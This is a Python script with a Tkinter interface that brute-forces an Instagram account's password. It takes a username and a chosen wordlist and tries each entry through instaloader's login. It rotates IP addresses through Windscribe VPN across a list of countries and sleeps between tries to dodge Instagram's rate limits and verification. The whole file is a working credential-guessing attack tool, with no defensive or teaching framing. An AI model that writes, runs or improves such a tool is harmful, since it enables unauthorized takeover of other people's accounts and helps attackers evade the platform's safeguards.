from tkinter import *
import pyautogui as gui
import tkinter as tk
import os
from sett import *
import easygui
import instaloader
from getpass import getpass
import time
import subprocess as sub
import random
import sys
import platform


system = "Windows"
if platform.system() != system:
    system = platform.system()
codeList = ["TR", "US-C", "US", "US-W", "CA", "CA-W",
            "FR", "DE", "NL", "NO", "RO", "CH", "GB", "HK"]
L = instaloader.Instaloader()
veri_break = "no"
class bcolors:
    BOLD = '\033[1m'
    PURPLE = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[95m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    UNDERLINE = '\033[4m'
def run():
    sleepp = int(e2.get())
    USER = e1.get()
    text_file = open("logforwl.txt", "r")
    wl =  text_file.read()
    file1 = open(wl, 'r')
    Lines = file1.readlines() 
    count = 0
    for line in Lines:
        try:
            PASSWORD = ""
            count += 1
            pstest = ("{}".format(line.strip()))
            PASSWORD = pstest
            choiceCode = random.choice(codeList)
            time.sleep(1)
            print("\n[Changing ip address]")
            os.system("\nwindscribe connect " + choiceCode)
            print(bcolors.WARNING+"\nTrying "+pstest+"..."+bcolors.ENDC)
            L.login(USER , PASSWORD)
            print(bcolors.OKGREEN+bcolors.UNDERLINE+bcolors.BOLD+"\nPassword found"+bcolors.ENDC+bcolors.OKGREEN+": "+bcolors.ENDC+pstest)
            break
            print("\n Turn off vpn")
            os.system("\nwindscribe disconnect ")
        except instaloader.exceptions.BadCredentialsException:
            pass
            print(bcolors.FAIL+"Incorret password: "+pstest+bcolors.ENDC)
            print("sleep for "+ str(sleepp))
            time.sleep(sleepp)

        except instaloader.exceptions.ConnectionException:
            print(bcolors.FAIL+"\nInstagram has been requested verification via sms, try to set more login time..."+bcolors.ENDC)
            break
            print("\n Turn off vpn")
            os.system("\nwindscribe disconnect ")
        except instaloader.exceptions.InvalidArgumentException:
            print(bcolors.FAIL+"\nUsername not found"+bcolors.ENDC)
            print("\n Turn off vpn")
            os.system("\nwindscribe disconnect ")

if sys.platform == 'win32':
    os.system("cls")
else:
    os.system("clear")


def novpn_run():
    sleepp = int(e2.get())
    USER = e1.get()
    text_file = open("logforwl.txt", "r")
    wl =  text_file.read()
    file1 = open(wl, 'r')
    Lines = file1.readlines() 
    count = 0
    for line in Lines:
        try:
            PASSWORD = ""
            count += 1
            pstest = ("{}".format(line.strip()))
            PASSWORD = pstest
            choiceCode = random.choice(codeList)
            time.sleep(1)
            print(bcolors.WARNING+"\nTrying "+pstest+"..."+bcolors.ENDC)
            L.login(USER , PASSWORD)
            print(bcolors.OKGREEN+bcolors.UNDERLINE+bcolors.BOLD+"\nPassword found"+bcolors.ENDC+bcolors.OKGREEN+": "+bcolors.ENDC+pstest)
            break

        except instaloader.exceptions.BadCredentialsException:
            pass
            print(bcolors.FAIL+"Incorret password: "+pstest+bcolors.ENDC)
            print("sleep for "+ str(sleepp))
            time.sleep(sleepp)

        except instaloader.exceptions.ConnectionException:
            print(bcolors.FAIL+"\nInstagram has been requested verification via sms, try to set more login time..."+bcolors.ENDC)
            break
        except instaloader.exceptions.InvalidArgumentException:
            print(bcolors.FAIL+"\nUsername not found"+bcolors.ENDC)


def winrun():
    sleepp = int(e2.get())
    USER = e1.get()
    text_file = open("logforwl.txt", "r")
    wl =  text_file.read()
    file1 = open(wl, 'r')
    Lines = file1.readlines() 
    count = 0
    for line in Lines:
        try:
            PASSWORD = ""
            count += 1
            pstest = ("{}".format(line.strip()))
            PASSWORD = pstest
            choiceCode = random.choice(codeList)
            time.sleep(1)
            print("\nTrying "+pstest+"...")
            L.login(USER , PASSWORD)
            print("\nPassword found: "+pstest)
            break

        except instaloader.exceptions.BadCredentialsException:
            pass
            print("Incorret password: "+pstest)
            print("sleep for "+ str(sleepp))
            time.sleep(sleepp)

        except instaloader.exceptions.ConnectionException:
            print("\nInstagram has been requested verification via sms, try to set more login time...")
            break
        except instaloader.exceptions.InvalidArgumentException:
            print("\nUsername not found")


    



def ul_run():
    if str(car.get()) == "0":
        novpn_run()
    elif system == "Windows":
        winrun()
    else:
        run()











def submit():
 
    name=name_var.get()
    password=passw_var.get()
     
    print("The name is : " + name)
    print("The password is : " + password)
     
    name_var.set("")
    passw_var.set("")


def choose_file():
    wl = easygui.fileopenbox()
    with open('logforwl.txt', 'w') as f:
        f.write(wl)
root = Tk()
root.configure(bg="#181818")
root.resizable(width=False, height=False)
root.geometry("300x260")
if platform.system() == 'Windows':
    root.iconbitmap("icon.ico")
platform.platform()


def a():
    label = tk.Label(root, text="tryng password ....",bg="#181818", fg="#F2F2F2").place(x=400, y=30)


def ver():
    print(car)
def show():
    print(car.get())
car = IntVar()
if sys.platform == 'win32':
    c =Checkbutton(root, text="VPN", variable=car, bg="#8758FF", fg="#F2F2F2", state= DISABLED)
else:
    c =Checkbutton(root, text="VPN", variable=car, bg="#8758FF", fg="#F2F2F2")
c.place(x=10, y=150)

chooseAfile = Button(root, text="choose word list", command=choose_file, bg="#8758FF", fg="#F2F2F2")
chooseAfile.place(x=10, y=100)
tk.Label(root, text="Username",bg="#181818", fg="#F2F2F2").place(x=10, y=30)
tk.Label(root, text="Sleep Time",bg="#181818", fg="#F2F2F2").place(x=10, y=60)
if sys.platform == 'win32':
    tk.Label(root, text="Vpn for windows is disabled\n if you wont use external one.",bg="#181818", fg="#F2F2F2").place(x=40, y=150)

e1 = tk.Entry(root, bg="#8758FF", fg="#F2F2F2")
e1.place(x=80, y=30)
e2 = tk.Entry(root, bg="#8758FF", fg="#F2F2F2")
e2.place(x=80, y=60)

run_attack = Button(root, text="Run attack", command=ul_run, bg="#8758FF", fg="#F2F2F2")
run_attack.place(x=10, y=200)


abc = ABC(root)
root.mainloop()


